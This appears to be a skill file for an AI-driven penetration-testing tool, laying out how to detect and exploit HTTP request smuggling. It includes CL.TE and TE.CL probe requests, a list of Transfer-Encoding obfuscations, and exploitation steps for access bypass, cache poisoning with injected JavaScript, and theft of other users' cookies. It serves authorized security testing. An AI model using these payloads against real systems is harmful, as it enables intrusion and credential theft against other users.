---
name: request-smuggling
description: HTTP request smuggling via CL.TE/TE.CL desync and cache poisoning
origin: Vigil
vuln_class: request-smuggling
---

# HTTP Request Smuggling Testing

## When to Activate

- Application behind reverse proxy, load balancer, or CDN
- Multiple HTTP servers in request processing chain
- HTTP/1.1 in use between frontend and backend

## Tools

- `curl` (raw request crafting)
- Burp Suite Repeater (disable auto content-length update)
- smuggler.py (automated detection)
- HTTP Request Smuggler (Burp extension)
- Custom scripts for precise byte-level control
- `vigil assess anomaly-score` — desync triage (§2/§3): replay each TE/CL obfuscation variant, record its status/length/timing, and let it rank the variant whose response broke from the pack (the desync candidate) instead of staring at near-identical responses.
- `vigil oob mint` / `vigil oob poll` — for the cache-poisoning exploitation path (§6): smuggle a prefix whose poisoned response redirects/loads from a minted host, then `poll` to prove a *different* user's connection followed it. Replaces reading the raw listener log. Readiness: `vigil oob status --json`.

## Methodology

### 1. Identify Architecture

- [ ] Determine if frontend proxy exists (CDN, load balancer, WAF)
- [ ] Check HTTP version between client→frontend and frontend→backend
- [ ] Identify server software from headers (nginx, Apache, HAProxy, Cloudflare)
- [ ] Note: HTTP/2 downgraded to HTTP/1.1 internally = also vulnerable

### 2. CL.TE Detection (Frontend uses Content-Length, Backend uses Transfer-Encoding)

- [ ] Send request with both CL and TE headers:
      ```
      POST / HTTP/1.1
      Host: target.example
      Content-Length: 6
      Transfer-Encoding: chunked

      0

      G
      ```
- [ ] If next request gets `GPOST` → CL.TE confirmed
- [ ] Time-based: backend waits for more chunked data → timeout difference

### 3. TE.CL Detection (Frontend uses Transfer-Encoding, Backend uses Content-Length)

- [ ] Send:
      ```
      POST / HTTP/1.1
      Host: target.example
      Content-Length: 3
      Transfer-Encoding: chunked

      1
      G
      0

      ```
- [ ] If next request returns unexpected response → TE.CL confirmed
- [ ] Time-based: backend reads CL bytes only, rest poisons next request

### 4. Transfer-Encoding Obfuscation

- [ ] `Transfer-Encoding: chunked` (standard)
- [ ] `Transfer-Encoding : chunked` (space before colon)
- [ ] `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
- [ ] `Transfer-Encoding: x\r\nTransfer-Encoding: chunked`
- [ ] `Transfer-Encoding:\tchunked` (tab)
- [ ] `Transfer-Encoding: chunked` (extra space)
- [ ] `X: x\r\nTransfer-Encoding: chunked` (header injection)
- [ ] Mixed case: `TrAnSfEr-EnCoDiNg: chunked`
- [ ] Line folding: `Transfer-Encoding:\n chunked`

**Triage the variant sweep deterministically.** Replaying ten obfuscation variants produces ten near-identical responses where the desync hides in a small status/length/timing delta. Record one response object per variant and rank the outlier rather than diffing by eye:

```bash
# After replaying each TE/CL variant, capture {status, content_length} per variant
# (include the timeout/timing as a record field if you measured it) into a JSONL
# file, one object per line, then:
vigil assess anomaly-score variant_responses.jsonl --top 5
```

The top-ranked record names the obfuscation that broke from the aligned-parser baseline (e.g. one variant returns a 200 + body where the rest 400, or one hangs producing a truncated/zero length). That divergence is your CL.TE/TE.CL candidate — confirm it with the timing differential in §9 before declaring. A flat ranking (all scores ~0) means every variant parsed identically: the chain is aligned on this technique, move to the next.

### 5. Exploitation — Access Control Bypass

- [ ] Smuggle request to internal-only endpoint
- [ ] Access `/admin` path that frontend blocks
- [ ] Bypass IP-based restrictions by smuggling past frontend

### 6. Exploitation — Web Cache Poisoning

- [ ] Smuggle a request whose poisoned response redirects or loads a resource from a minted callback host — that nonce host is how you prove a *victim's* connection (not yours) consumed the poisoned entry:
```bash
vigil oob mint --technique request-smuggling --target-url https://target/ \
  --param smuggled-prefix --probe-kind cache-poison
# Smuggle the prefix so the cached response points at <nonce>.researcher.example,
# then poll — a matched hit from another connection = cross-user cache poisoning.
vigil oob poll --client <name>
```
- [ ] Victim receives attacker-controlled content from cache — a matched callback originating from a request you did not send is the cross-user proof, not just that you could set the cached body.
- [ ] Inject malicious JavaScript via poisoned response (point the injected `src` at the minted host to confirm execution lands).

### 7. Exploitation — Credential Theft

- [ ] Smuggle partial request that captures next user's request:
      ```
      POST /store-comment HTTP/1.1
      Content-Length: 400

      comment=
      ```
- [ ] Next user's request (with cookies/auth) appended to comment body
- [ ] Read stolen headers from stored location

### 8. HTTP/2 Specific

- [ ] H2.CL smuggling: HTTP/2 with Content-Length to HTTP/1.1 backend
- [ ] H2.TE smuggling: inject Transfer-Encoding in HTTP/2
- [ ] Request splitting via header injection in HTTP/2 pseudo-headers
- [ ] CRLF injection in HTTP/2 header values

### 9. Validation

- [ ] Confirm desync with timing differential (10+ second difference)
- [ ] Use unique identifiers to track smuggled requests
- [ ] Test multiple times — smuggling can affect other users
- [ ] Be cautious: smuggling is disruptive in shared environments

## What to Record

- Frontend/backend architecture
- Smuggling type: CL.TE, TE.CL, H2.CL, or H2.TE
- Exact request bytes used for detection
- TE obfuscation technique that worked
- Exploitation achieved (access bypass, cache poison, credential theft) — for a cache poison, attach the matched probe<->callback from `vigil oob poll --client <name> --json` proving a cross-user connection followed the poisoned response
- Severity: Critical (credential theft, cache poisoning) or High (access bypass)
- Remediation: normalize CL/TE handling, use HTTP/2 end-to-end, reject ambiguous requests

## Kill Signals — Stop Testing When
- Target uses HTTP/2 end-to-end with no downgrade → classic smuggling not applicable, test H2-specific only
- No proxy/load balancer detected (single server) → smuggling requires parsing disagreement between 2+ servers, move on
- CL.TE or TE.CL detection confirmed → record finding, proceed to exploitation, do NOT test remaining variants
- All detection techniques (CL.TE, TE.CL, TE.TE, H2) fail → infrastructure is aligned, move on

## Escalate When
- A timing-based smuggle probe (long CL + short body, or vice versa) produces a >5s hang on one payload but returns immediately on its control — parser disagreement is present, walk the full CL.TE / TE.CL / TE.TE variant set before declaring
- Response differs between `Content-Length: X` and `Transfer-Encoding: chunked` with the same body — the front and back disagree on framing, craft a smuggled prefix and hunt a cross-user cache or queue poison
- Headers like `Transfer-Encoding: chunked\r\nX-Foo: bar` or obfuscated forms (`Transfer-Encoding : chunked`, `Transfer-encoding: xchunked`, tabbed whitespace, duplicate TE) change behavior between requests — one proxy ignores them, the other parses them, that is the disagreement
- HTTP/2 is terminated at the edge and downgraded to HTTP/1.1 upstream — H2.CL and H2.TE request-splitting are live, test pseudo-header injection and H2 body desync even when H1 detection fails
- A smuggled request lands authentication/auth-bypass semantics on another user's connection (prefix injection of `X-Forwarded-For`, cache-key manipulation, host-header rewrite) — escalate immediately to cross-user impact, this is the real severity driver

## Extended Resources

- `agent/references/payloads/request-smuggling-payloads.md` — CL.TE, TE.CL, TE.TE obfuscation, HTTP/2 downgrade
